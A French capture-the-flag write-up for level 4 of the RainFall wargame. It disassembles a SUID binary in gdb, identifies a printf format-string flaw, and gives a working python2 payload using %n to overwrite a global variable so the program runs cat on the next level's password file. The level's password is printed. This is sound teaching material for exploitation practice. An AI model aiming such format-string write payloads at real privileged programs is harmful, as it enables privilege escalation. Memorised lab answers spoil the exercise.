# LEVEL4

Le système de fichier se présente de cette manière:

``` diff
level4@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
```

Le fichier `level4` est un exécutable.

Le bit `SUID` est activé, l'utilisateur `level4` peut exécuter le programme avec les droits de `level5`.

Le programme attend une string qu'il print sur stdout :

``` bash
level4@RainFall:~$ ./level4 
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA
```

En observant le code assembleur, on peut voir un appel à la fonction `n` puis à `p` et dans `n` un appel à `system`. C'est ce `system` qu'on va vouloir exécuter, car en examinant son argument il nous permettra de récupèrer le mot de passe du level 5.

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
```


``` bash
Breakpoint 2, 0x08048460 in n ()
(gdb) x/s 0x8048590
0x8048590:	 "/bin/cat /home/user/level5/.pass"
```

Le code assembleur de `n` montre un appel à la fonction sécurisée `fgets` qui prend stdin en argument.
La fonction `p` elle appelle `printf` qui prend uniquement un buffer via stdin comme argument.


``` diff
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
+   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
+   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810                 
   0x08048492 <+59>:	cmp    eax,0x1025544                    # = 16930116 en decimal
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
+   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
```

``` bash
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>           # modifie eax
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
```

Dans `n` il y a une comparaison d'une variable globale. En fonction du résultat le programme jump après l'appel à `system`.

``` bash
   0x0804848d <+54>:	mov    eax,ds:0x8049810                 
   0x08048492 <+59>:	cmp    eax,0x1025544                    # = 16930116 en decimal
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
```

Pour pouvoir rentrer dans la portion de code qui éxecute `system` il faut que la valeur pointée par l'adresse `0x8049810` soit égale à `0x1025544` (soit `16930116` en décimal).

Avec objdump on peut examiner l'elf et voir la variable initialisée à 0 dans la section `.data`:
``` bash
level4@RainFall:~$ objdump -D level4
Disassembly of section .data:
[...]
08049810 <m>:
 8049810:	00 00                	add    %al,(%eax)
```

Le défi ici relève d'une faille de type format string. 
Nous allons donc construire un exploit qui va écrire 16930116 octets à l'adresse `0x8049810`.

Pour cela on identifie la position de l'argument du printf dans sa sortie avec le spécificateur `%x`

``` bash
level4@RainFall:~$ echo $(python2 -c 'print("AAAA" + "%08x-" * 15)') | ./level4
AAAAb7ff26b0-bffff784-b7fd0ff4-00000000-00000000-bffff748-0804848d-bffff540-00000200-b7fd1ac0-b7ff37d0-41414141-78383025-3830252d-30252d78-
```

Comme l'indique la valeur `41` en hexa (correspondant au char 'A'), l'argument du `printf` se situe à la douzième position.

Pour l'exploit on va écrire un script python qui écrit:
- l'adresse `0x8049810` en little endian "\x10\x98\x04\x08" 
- un padding de 16930112, qui correspond à 16930116 moins les 4 octets de l'adresse
- et cibler le 12ème argument (correspondant à 0x8049810) avec `%n` pour écrire les 16930116 octets jusque là écrits 

Le spécificateur %n écrit, à l'adresse pointée par l'argument correspondant, le nombre total de caractères déjà affichés par printf à ce stade de l'exécution, c'est cette primitive d'écriture qui permet de contrôler la valeur de la variable m.

D'autre part, contrairement au level3 où le padding se faisait par répétition littérale de caractères, il serait ici  impraticable d'envoyer 16930112 octets de bourrage dans le payload lui-même. On utilise donc le champ de largeur de %d (%16930112d) qui permet d'obtenir le même effet de comptage sans avoir à transmettre physiquement ces octets : printf génère lui-même le padding en interne.

``` bash
(echo $(python2 -c 'import sys; sys.stdout.write("\x10\x98\x04\x08" + "%16930112d%12$n")')) | ./level4



                     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Le nombre -1208015184 correspond à une valeur résiduelle présente sur la pile à cette position, interprétée comme un entier signé par %d.